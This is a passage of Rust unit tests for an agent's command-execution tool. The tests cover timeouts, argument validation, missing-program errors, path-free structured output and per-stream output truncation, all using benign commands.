            &ExecCommandArgs {
                shell: Some("echo early; sleep 30".into()),
                timeout_ms: Some(400),
                ..Default::default()
            },
        )
        .unwrap();
        assert!(r.timed_out, "{}", r.text);
        assert!(r.text.contains("early"), "{}", r.text);
    }

    #[test]
    fn cmd_and_shell_are_one_or_the_other() {
        let f = fixture("shell-args");
        let both = fails(
            &f,
            ExecCommandArgs {
                cmd: vec!["true".into()],
                shell: Some("true".into()),
                ..Default::default()
            },
        );
        assert_eq!(both.code(), ErrorCode::InvalidArgs);
        assert!(both.message().contains("not both"), "{both}");

        for line in ["", "   "] {
            let e = fails(
                &f,
                ExecCommandArgs {
                    shell: Some(line.into()),
                    ..Default::default()
                },
            );
            assert_eq!(e.code(), ErrorCode::InvalidArgs, "{line:?}");
            assert!(e.message().contains("shell is empty"), "{e}");
        }
        let e = fails(
            &f,
            ExecCommandArgs {
                shell: Some("echo a\0b".into()),
                ..Default::default()
            },
        );
        assert!(e.message().contains("shell contains a NUL byte"), "{e}");
        // Neither says what both are for.
        let e = fails(&f, ExecCommandArgs::default());
        assert!(e.message().contains("shell"), "{e}");
    }

    #[test]
    fn without_bash_the_error_names_it_and_the_way_round() {
        let e = missing_program("bash", true);
        assert_eq!(e.code(), ErrorCode::Dependency);
        assert!(e.message().starts_with("bash is not installed"), "{e}");
        assert!(e.message().contains("in cmd instead"), "{e}");
        // A plain cmd gets no advice about shells.
        assert!(!missing_program("cargo", false).message().contains("shell"));
    }

    #[test]
    fn a_missing_program_names_itself_and_is_a_dependency_problem() {
        let f = fixture("missing");
        let e = fails(
            &f,
            ExecCommandArgs {
                cmd: vec!["ccnm-definitely-not-a-program".into()],
                ..Default::default()
            },
        );
        assert_eq!(e.code(), ErrorCode::Dependency);
        assert!(e.message().contains("ccnm-definitely-not-a-program"), "{e}");
    }

    #[test]
    fn structured_content_carries_no_output_and_no_local_paths() {
        let f = fixture("bounded");
        let r = run(&f, &["cat", "marker.txt"]);
        let json = serde_json::to_string(&r).unwrap();
        assert!(!json.contains("in the root"), "{json}");
        assert!(!json.contains(&f.root.display().to_string()), "{json}");
        assert!(!json.contains(&f.state.display().to_string()), "{json}");
        assert!(json.contains("\"output_ref\""), "{json}");
    }

    /// The per-stream limit cuts the retained copy, not the command: it
    /// still runs to completion, its byte counts are the real ones, and a
    /// pipe that nobody reads past the limit is still drained -- 1 MiB is
    /// far more than a pipe buffer, so a sink that stopped reading would
    /// hang here until the timeout.
    #[test]
    fn a_stream_past_its_limit_is_cut_and_the_command_still_finishes() {
        let f = fixture("per-stream");
        let output = Arc::new(Output::with_limits(
            &f.state,
            "s-cut",
            Limits {
                per_stream: 1024,
                ..Limits::RUNTIME
            },
        ));
        let r = exec_command_in(
            crate::provider::AgentProvider::Claude,
            &f.root,
            &output,
            &ExecCommandArgs {
                cmd: vec![
                    "sh".into(),
                    "-c".into(),
                    "head -c 1048576 /dev/zero; echo short >&2".into(),
                ],
                timeout_ms: Some(20_000),
                ..Default::default()
            },
            Running {
                jobs: &Jobs::new(),
                stop: Arc::default(),
                sandbox: None,
            },
        )
        .unwrap();
        assert_eq!(r.exit_code, Some(0), "{}", r.text);
        assert!(!r.timed_out);
        assert_eq!(r.stdout_bytes, 1_048_576);
        let run = output.dir().join(&r.output_ref);
        assert_eq!(fs::metadata(run.join("stdout")).unwrap().len(), 1024);
        assert_eq!(fs::read_to_string(run.join("stderr")).unwrap(), "short\n");
        assert!(
            r.notes
                .iter()
                .any(|n| n.contains("more than 1024 B on one stream")),
            "{:?}",
            r.notes
        );
    }
}
